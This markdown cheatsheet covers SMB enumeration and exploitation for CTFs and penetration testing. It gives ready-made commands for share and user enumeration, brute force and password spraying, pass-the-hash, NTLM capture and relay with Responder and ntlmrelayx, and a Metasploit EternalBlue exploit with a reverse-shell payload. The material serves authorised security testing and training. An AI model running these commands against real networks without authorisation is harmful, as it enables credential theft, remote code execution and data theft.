---
title: SMB Enumeration Cheatsheet
slug: smb-enum
date: 2026-08-16
updated: 2026-08-19
tags: [windows, active-directory, smb, enumeration, scanning, recon]
description: A comprehensive guide for enumerating and exploiting SMB (Server Message Block) services during CTFs and penetration testing.
---
# SMB Enumeration Cheatsheet

---

## Table of Contents
1. [Port & Service Detection](#port--service-detection)
2. [Null Session / Anonymous Enumeration](#null-session--anonymous-enumeration)
3. [Share Enumeration](#share-enumeration)
4. [User Enumeration](#user-enumeration)
5. [RPC & SAMR Enumeration](#rpc--samr-enumeration)
6. [Password Attacks](#password-attacks)
7. [SMB Relay & NTLM Attacks](#smb-relay--ntlm-attacks)
8. [Exploitation](#exploitation)
9. [File Operations](#file-operations)
10. [Useful Tools Reference](#useful-tools-reference)

---

## Port & Service Detection

```bash
# Nmap SMB scripts
nmap -p 445 --script smb-os-discovery <target>
nmap -p 445 --script smb-protocols <target>
nmap -p 445 --script smb-security-mode <target>
nmap -p 445 --script smb-enum-shares <target>
nmap -p 445 --script smb-enum-users <target>
nmap -p 445 --script smb-enum-sessions <target>
nmap -p 445 --script smb-enum-domains <target>
nmap -p 445 --script smb-vuln-* <target>
nmap -p 445 --script smb-vuln-ms17-010 <target>
nmap -p 445 --script smb-vuln-ms08-067 <target>

# Full SMB script scan
nmap -p 445 --script "smb-* and not smb-brute and not smb-flood" <target>

# Version detection
nmap -sV -p 445 <target>
nmap -A -p 445 <target>

# NetBIOS
nmap -p 137,138,139,445 --script nbstat <target>
nbtscan -r <target>
```

---

## Null Session / Anonymous Enumeration

```bash
# Check for null session (no credentials)
smbclient -L //<target> -N
smbclient -L //<target> -U ''
smbclient -L //<target> -U '' -N

# smbmap with null session
smbmap -H <target>
smbmap -H <target> -u '' -p ''
smbmap -H <target> -u 'guest' -p ''

# rpcclient null session
rpcclient -U '' -N <target>
rpcclient -U '%' <target>

# enum4linux null session
enum4linux -a <target>
enum4linux -U <target>          # Users
enum4linux -S <target>          # Shares
enum4linux -G <target>          # Groups
enum4linux -P <target>          # Password policy
enum4linux -o <target>          # OS info
```

---

## Share Enumeration

```bash
# List shares
smbclient -L //<target> -U <username>%<password>
showmount -e <target>           # NFS shares (often alongside SMB)

# smbmap share enumeration
smbmap -H <target>
smbmap -H <target> -u <user> -p <password>
smbmap -H <target> -R           # Recursive listing
smbmap -H <target> -r <share>   # List specific share
smbmap -H <target> --download <share>/<file>
smbmap -H <target> --upload <localfile> <share>/<remotefile>

# CrackMapExec share listing
crackmapexec smb <target> -u <user> -p <password> --shares
crackmapexec smb <target> -u <user> -p <password> -M spider_plus

# smbclient interactive
smbclient //<target>/<share> -U <username>%<password>
smbclient //<target>/<share> -U <username>   # Will prompt for password

# Inside smbclient shell
smb: \> ls
smb: \> dir
smb: \> cd <directory>
smb: \> get <file>
smb: \> put <file>
smb: \> mget <files>
smb: \> mask "*"
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

---

## User Enumeration

```bash
# rpcclient user queries
rpcclient -U <user>%<pass> <target>

# Inside rpcclient
rpcclient $> enumdomusers
rpcclient $> queryuser <rid>
rpcclient $> queryusergroups <rid>
rpcclient $> querygroup <group_rid>
rpcclient $> enumdomgroups
rpcclient $> querydispinfo
rpcclient $> getdompwinfo
rpcclient $> lookupsids <sid>

# enum4linux user enumeration
enum4linux -U <target>
enum4linux -u <user> -p <pass> -U <target>

# CrackMapExec user enumeration
crackmapexec smb <target> -u <user> -p <password> --users
crackmapexec smb <target> -u <user> -p <password> --rid-brute

# Impacket lookupsid.py
lookupsid.py <domain>/<user>:<password>@<target>
lookupsid.py <domain>/<user>:<password>@<target> -domain-sids

# LDAP user enumeration (if LDAP is open)
ldapsearch -x -H ldap://<target> -b "dc=<domain>,dc=<tld>"
ldapsearch -x -H ldap://<target> -D "<user>@<domain>" -w <password> -b "dc=<domain>,dc=<tld>" "(objectClass=user)"
```

---

## RPC & SAMR Enumeration

```bash
# rpcclient deep enumeration
rpcclient -U <user>%<pass> <target>

rpcclient $> srvinfo
rpcclient $> enumdomusers
rpcclient $> enumdomgroups
rpcclient $> queryuser <rid>
rpcclient $> querygroup <rid>
rpcclient $> querydispinfo
rpcclient $> getdompwinfo
rpcclient $> getusrdompwinfo <rid>
rpcclient $> enumalsgroups <domain>
rpcclient $> lookupnames <username>
rpcclient $> lookupsids <sid>

# Impacket samrdump.py
samrdump.py <domain>/<user>:<password>@<target>

# Impacket rpcdump.py
rpcdump.py <target>
```

---

## Password Attacks

```bash
# Hydra SMB brute force
hydra -l <user> -P /usr/share/wordlists/rockyou.txt smb://<target>
hydra -L users.txt -P passwords.txt smb://<target>
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<target>

# Medusa
medusa -h <target> -u <user> -P /usr/share/wordlists/rockyou.txt -M smbnt

# CrackMapExec password spray
crackmapexec smb <target> -u users.txt -p passwords.txt
crackmapexec smb <target> -u users.txt -p 'Password123!'
crackmapexec smb <target> -u users.txt -H hashes.txt  # Pass-the-hash

# Nmap smb-brute
nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# Impacket psexec with credentials
psexec.py <domain>/<user>:<password>@<target>
psexec.py <domain>/<user>@<target> -hashes <LMHASH>:<NTHASH>

# Pass-the-Hash
psexec.py <domain>/<user>@<target> -hashes <NTHASH>
smbexec.py <domain>/<user>@<target> -hashes <NTHASH>
wmiexec.py <domain>/<user>@<target> -hashes <NTHASH>
atexec.py <domain>/<user>@<target> -hashes <NTHASH>
```

---

## SMB Relay & NTLM Attacks

```bash
# Responder (capture NTLM hashes)
responder -I <interface>
responder -I <interface> -wrfv

# ntlmrelayx (relay captured hashes)
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
ntlmrelayx.py -tf targets.txt -smb2support -i
ntlmrelayx.py -tf targets.txt -smb2support -socks

# MultiRelay (from Impacket)
MultiRelay.py -t <target> -u ALL

# SMB signing check
crackmapexec smb <target> --gen-relay-list relay.txt
crackmapexec smb targets.txt --gen-relay-list relay_targets.txt

# Check if SMB signing is required
nmap -p 445 --script smb-security-mode <target>
```

---

## Exploitation

```bash
# MS17-010 (EternalBlue)
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <your_ip>
exploit

# AutoBlue-MS17-010 (Python)
python3 eternalblue_exploit7.py <target> shellcode/sc_x64.bin

# MS08-067 (NetAPI)
# Metasploit
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <target>
exploit

# CVE-2020-0796 (SMBGhost)
# Metasploit
use exploit/windows/local/cve_2020_0796_smbghost

# PrintNightmare (CVE-2021-34527)
# Various PoCs available on GitHub

# Impacket psexec for code execution
psexec.py <domain>/<user>:<password>@<target>
psexec.py <domain>/<user>@<target> -hashes <NTHASH>

# Impacket smbexec (stealthier)
smbexec.py <domain>/<user>:<password>@<target>

# Impacket wmiexec (WMI-based, no service creation)
wmiexec.py <domain>/<user>:<password>@<target>

# Impacket atexec (scheduled task-based)
atexec.py <domain>/<user>:<password>@<target> "whoami"
```

---

## File Operations

```bash
# Mount SMB share
sudo mount -t cifs //<target>/<share> /mnt/smb -o username=<user>,password=<pass>
sudo mount -t cifs //<target>/<share> /mnt/smb -o username=<user>,password=<pass>,domain=<domain>

# Mount with guest/null session
sudo mount -t cifs //<target>/<share> /mnt/smb -o guest
sudo mount -t cifs //<target>/<share> /mnt/smb -o username='',password=''

# smbget (wget-like for SMB)
smbget -R smb://<target>/<share>/<path>
smbget -R smb://<user>:<pass>@<target>/<share>/<path>

# smbclient file operations
smbclient //<target>/<share> -U <user>%<pass> -c "ls"
smbclient //<target>/<share> -U <user>%<pass> -c "get <file>"
smbclient //<target>/<share> -U <user>%<pass> -c "put <file>"
smbclient //<target>/<share> -U <user>%<pass> -c "recurse; prompt OFF; mget *"

# Download entire share
smbmap -H <target> -R <share> --download <share>/<file>
smbmap -H <target> -r <share> -A <pattern> -q  # Download files matching pattern
```

---

## Useful Tools Reference

| Tool | Purpose | Example |
|------|---------|---------|
| `smbclient` | SMB client for file ops & share listing | `smbclient -L //target` |
| `smbmap` | Share enumeration & file listing | `smbmap -H target` |
| `rpcclient` | RPC queries (users, groups, SIDs) | `rpcclient -U '' target` |
| `enum4linux` | All-in-one SMB enumeration | `enum4linux -a target` |
| `crackmapexec` | SMB pentesting swiss army knife | `cme smb target -u user -p pass` |
| `impacket` suite | Python SMB/NTLM tools | `psexec.py`, `smbexec.py`, `wmiexec.py` |
| `responder` | LLMNR/NBT-NS/mDNS poisoner | `responder -I eth0` |
| `ntlmrelayx.py` | NTLM relay attacks | `ntlmrelayx.py -tf targets.txt` |
| `hydra` / `medusa` | Brute force | `hydra -l user -P pass.txt smb://target` |
| `nmap` | Port scanning & SMB scripts | `nmap -p 445 --script smb-* target` |

---

## 🔧 Quick Enumeration Workflow

```bash
# 1. Detect SMB & version
nmap -p 445 -sV --script smb-os-discovery,smb-protocols <target>

# 2. Check for null session
smbclient -L //<target> -N
smbmap -H <target>

# 3. Enumerate shares, users, groups
enum4linux -a <target>
crackmapexec smb <target> -u '' -p '' --shares

# 4. List share contents
smbmap -H <target> -R
smbclient //<target>/<share> -N -c "ls"

# 5. Check for vulnerabilities
nmap -p 445 --script smb-vuln-* <target>

# 6. Attempt access with credentials / hashes
psexec.py <domain>/<user>:<password>@<target>
psexec.py <domain>/<user>@<target> -hashes <NTHASH>

# 7. If hashes captured, relay
responder -I eth0
ntlmrelayx.py -tf targets.txt -smb2support
```

---
